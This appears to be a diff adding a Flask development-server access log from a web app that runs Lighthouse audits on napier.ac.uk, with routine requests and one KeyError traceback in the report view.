+77.101.234.187 - - [02/Dec/2020 14:25:11] "[37mGET /report?report=115 HTTP/1.1[0m" 200 -
+77.101.234.187 - - [02/Dec/2020 14:25:16] "[37mGET /list HTTP/1.1[0m" 200 -
+77.101.234.187 - - [02/Dec/2020 14:25:19] "[35m[1mGET /report?report=106 HTTP/1.1[0m" 500 -
+Traceback (most recent call last):
+  File "/home/FlaskApp/FlaskAppEnv/lib/python3.8/site-packages/flask/app.py", line 2464, in __call__
+    return self.wsgi_app(environ, start_response)
+  File "/home/FlaskApp/FlaskAppEnv/lib/python3.8/site-packages/flask/app.py", line 2450, in wsgi_app
+    response = self.handle_exception(e)
+  File "/home/FlaskApp/FlaskAppEnv/lib/python3.8/site-packages/flask/app.py", line 1867, in handle_exception
+    reraise(exc_type, exc_value, tb)
+  File "/home/FlaskApp/FlaskAppEnv/lib/python3.8/site-packages/flask/_compat.py", line 39, in reraise
+    raise value
+  File "/home/FlaskApp/FlaskAppEnv/lib/python3.8/site-packages/flask/app.py", line 2447, in wsgi_app
+    response = self.full_dispatch_request()
+  File "/home/FlaskApp/FlaskAppEnv/lib/python3.8/site-packages/flask/app.py", line 1952, in full_dispatch_request
+    rv = self.handle_user_exception(e)
+  File "/home/FlaskApp/FlaskAppEnv/lib/python3.8/site-packages/flask/app.py", line 1821, in handle_user_exception
+    reraise(exc_type, exc_value, tb)
+  File "/home/FlaskApp/FlaskAppEnv/lib/python3.8/site-packages/flask/_compat.py", line 39, in reraise
+    raise value
+  File "/home/FlaskApp/FlaskAppEnv/lib/python3.8/site-packages/flask/app.py", line 1950, in full_dispatch_request
+    rv = self.dispatch_request()
+  File "/home/FlaskApp/FlaskAppEnv/lib/python3.8/site-packages/flask/app.py", line 1936, in dispatch_request
+    return self.view_functions[rule.endpoint](**req.view_args)
+  File "/home/FlaskApp/audt.py", line 146, in report
+    class reportClass:
+  File "/home/FlaskApp/audt.py", line 160, in reportClass
+    altScoreAmount = len(data['audits']['image-alt']['details']['items'])
+KeyError: 'details'
+77.101.234.187 - - [02/Dec/2020 14:25:19] "[37mGET /report?__debugger__=yes&cmd=resource&f=style.css HTTP/1.1[0m" 200 -
+77.101.234.187 - - [02/Dec/2020 14:25:19] "[37mGET /report?__debugger__=yes&cmd=resource&f=jquery.js HTTP/1.1[0m" 200 -
+77.101.234.187 - - [02/Dec/2020 14:25:19] "[37mGET /report?__debugger__=yes&cmd=resource&f=debugger.js HTTP/1.1[0m" 200 -
+77.101.234.187 - - [02/Dec/2020 14:25:20] "[37mGET /report?__debugger__=yes&cmd=resource&f=ubuntu.ttf HTTP/1.1[0m" 200 -
+77.101.234.187 - - [02/Dec/2020 14:25:20] "[37mGET /report?__debugger__=yes&cmd=resource&f=console.png HTTP/1.1[0m" 200 -
+77.101.234.187 - - [02/Dec/2020 14:25:23] "[37mGET /report?report=114 HTTP/1.1[0m" 200 -
+77.101.234.187 - - [02/Dec/2020 14:25:27] "[37mGET / HTTP/1.1[0m" 200 -
+77.101.234.187 - - [02/Dec/2020 14:25:44] "[37mPOST /processurl HTTP/1.1[0m" 200 -
+- Running Lighthouse on https://www.napier.ac.uk ...
+
+77.101.234.187 - - [02/Dec/2020 14:25:47] "[37mGET /processurl?data=133 HTTP/1.1[0m" 200 -
+77.101.234.187 - - [02/Dec/2020 14:25:50] "[37mGET /processurl?data=133 HTTP/1.1[0m" 200 -
+77.101.234.187 - - [02/Dec/2020 14:25:54] "[37mGET /processurl?data=133 HTTP/1.1[0m" 200 -
+77.101.234.187 - - [02/Dec/2020 14:25:57] "[37mGET /processurl?data=133 HTTP/1.1[0m" 200 -
+77.101.234.187 - - [02/Dec/2020 14:26:01] "[32mGET /processurl?data=133 HTTP/1.1[0m" 302 -
+77.101.234.187 - - [02/Dec/2020 14:26:01] "[37mGET /report?report=133 HTTP/1.1[0m" 200 -
+77.101.234.187 - - [02/Dec/2020 14:26:26] "[37mGET / HTTP/1.1[0m" 200 -
+77.101.234.187 - - [02/Dec/2020 14:27:55] "[37mPOST /processurl HTTP/1.1[0m" 200 -
+77.101.234.187 - - [02/Dec/2020 14:28:17] "[37mPOST /processurl HTTP/1.1[0m" 200 -
+77.101.234.187 - - [02/Dec/2020 14:28:27] "[37mPOST /processurl HTTP/1.1[0m" 200 -
+77.101.234.187 - - [02/Dec/2020 14:28:41] "[37mPOST /processurl HTTP/1.1[0m" 200 -
+- Running Lighthouse on http://napier.ac.uk ...
+
+77.101.234.187 - - [02/Dec/2020 14:28:44] "[37mGET /processurl?data=134 HTTP/1.1[0m" 200 -
+77.101.234.187 - - [02/Dec/2020 14:28:48] "[37mGET /processurl?data=134 HTTP/1.1[0m" 200 -
+77.101.234.187 - - [02/Dec/2020 14:28:51] "[37mGET /processurl?data=134 HTTP/1.1[0m" 200 -
+77.101.234.187 - - [02/Dec/2020 14:28:54] "[37mGET /processurl?data=134 HTTP/1.1[0m" 200 -
+77.101.234.187 - - [02/Dec/2020 14:28:58] "[37mGET /processurl?data=134 HTTP/1.1[0m" 200 -
+
+WARNING: The page may not be loading as expected because your test URL (http://napier.ac.uk/) was redirected to https://www.napier.ac.uk/. Try testing the second URL directly.
+
+
+77.101.234.187 - - [02/Dec/2020 14:29:01] "[32mGET /processurl?data=134 HTTP/1.1[0m" 302 -
+77.101.234.187 - - [02/Dec/2020 14:29:01] "[37mGET /report?report=134 HTTP/1.1[0m" 200 -
+77.101.234.187 - - [02/Dec/2020 14:29:07] "[37mGET /list HTTP/1.1[0m" 200 -
+77.101.234.187 - - [02/Dec/2020 14:29:14] "[37mGET / HTTP/1.1[0m" 200 -
+77.101.234.187 - - [02/Dec/2020 14:30:53] "[37mGET /list HTTP/1.1[0m" 200 -
+77.101.234.187 - - [02/Dec/2020 14:30:58] "[37mGET / HTTP/1.1[0m" 200 -
+77.101.234.187 - - [02/Dec/2020 14:30:59] "[37mGET / HTTP/1.1[0m" 200 -
+77.101.234.187 - - [02/Dec/2020 14:31:06] "[37mPOST /processurl HTTP/1.1[0m" 200 -
+77.101.234.187 - - [02/Dec/2020 14:31:21] "[37mPOST /processurl HTTP/1.1[0m" 200 -
+- Running Lighthouse on https://www.napier.ac.uk ...
+
+77.101.234.187 - - [02/Dec/2020 14:31:24] "[37mGET /processurl?data=135 HTTP/1.1[0m" 200 -
+77.101.234.187 - - [02/Dec/2020 14:31:27] "[37mGET /processurl?data=135 HTTP/1.1[0m" 200 -
+77.101.234.187 - - [02/Dec/2020 14:31:31] "[37mGET /processurl?data=135 HTTP/1.1[0m" 200 -
+77.101.234.187 - - [02/Dec/2020 14:31:34] "[37mGET /processurl?data=135 HTTP/1.1[0m" 200 -
+77.101.234.187 - - [02/Dec/2020 14:31:38] "[32mGET /processurl?data=135 HTTP/1.1[0m" 302 -
+77.101.234.187 - - [02/Dec/2020 14:31:38] "[37mGET /report?report=135 HTTP/1.1[0m" 200 -
+77.101.234.187 - - [02/Dec/2020 14:32:30] "[37mGET /list HTTP/1.1[0m" 200 -
+77.101.234.187 - - [02/Dec/2020 14:32:35] "[37mGET /report?report=127 HTTP/1.1[0m" 200 -
+77.101.234.187 - - [02/Dec/2020 14:33:40] "[37mGET / HTTP/1.1[0m" 200 -
+77.101.234.187 - - [02/Dec/2020 14:33:49] "[37mGET /list HTTP/1.1[0m" 200 -
+77.101.234.187 - - [02/Dec/2020 14:33:51] "[37mGET / HTTP/1.1[0m" 200 -
+94.173.218.222 - - [02/Dec/2020 14:36:09] "[37mGET / HTTP/1.1[0m" 200 -
+94.173.218.222 - - [02/Dec/2020 14:36:09] "[37mGET /static/css/style.css HTTP/1.1[0m" 200 -
+94.173.218.222 - - [02/Dec/2020 14:36:09] "[37mGET /static/images/logo.svg HTTP/1.1[0m" 200 -
+94.173.218.222 - - [02/Dec/2020 14:36:09] "[37mGET /static/images/aboutuspic.jpg HTTP/1.1[0m" 200 -
+94.173.218.222 - - [02/Dec/2020 14:36:09] "[37mGET /static/images/favicon.png HTTP/1.1[0m" 200 -
+77.101.234.187 - - [02/Dec/2020 14:37:07] "[37mPOST /processurl HTTP/1.1[0m" 200 -
+77.101.234.187 - - [02/Dec/2020 14:37:13] "[37mPOST /processurl HTTP/1.1[0m" 200 -
+77.101.234.187 - - [02/Dec/2020 14:37:24] "[37mPOST /processurl HTTP/1.1[0m" 200 -
+- Running Lighthouse on https://www.napier.ac.uk ...
+
+77.101.234.187 - - [02/Dec/2020 14:37:27] "[37mGET /processurl?data=136 HTTP/1.1[0m" 200 -
+77.101.234.187 - - [02/Dec/2020 14:37:31] "[37mGET /processurl?data=136 HTTP/1.1[0m" 200 -
+77.101.234.187 - - [02/Dec/2020 14:37:34] "[37mGET /processurl?data=136 HTTP/1.1[0m" 200 -
+77.101.234.187 - - [02/Dec/2020 14:37:37] "[37mGET /processurl?data=136 HTTP/1.1[0m" 200 -
+77.101.234.187 - - [02/Dec/2020 14:37:41] "[37mGET /processurl?data=136 HTTP/1.1[0m" 200 -
+77.101.234.187 - - [02/Dec/2020 14:37:44] "[32mGET /processurl?data=136 HTTP/1.1[0m" 302 -
+77.101.234.187 - - [02/Dec/2020 14:37:45] "[37mGET /report?report=136 HTTP/1.1[0m" 200 -
+77.101.234.187 - - [02/Dec/2020 14:38:32] "[37mGET /list HTTP/1.1[0m" 200 -
+77.101.234.187 - - [02/Dec/2020 14:38:39] "[37mGET / HTTP/1.1[0m" 200 -
+94.173.218.222 - - [02/Dec/2020 14:48:14] "[37mGET /list HTTP/1.1[0m" 200 -
+94.173.218.222 - - [02/Dec/2020 14:48:17] "[37mGET /report?report=136 HTTP/1.1[0m" 200 -
+94.173.218.222 - - [02/Dec/2020 14:48:29] "[37mGET / HTTP/1.1[0m" 200 -
+94.173.218.222 - - [02/Dec/2020 14:48:32] "[37mGET / HTTP/1.1[0m" 200 -
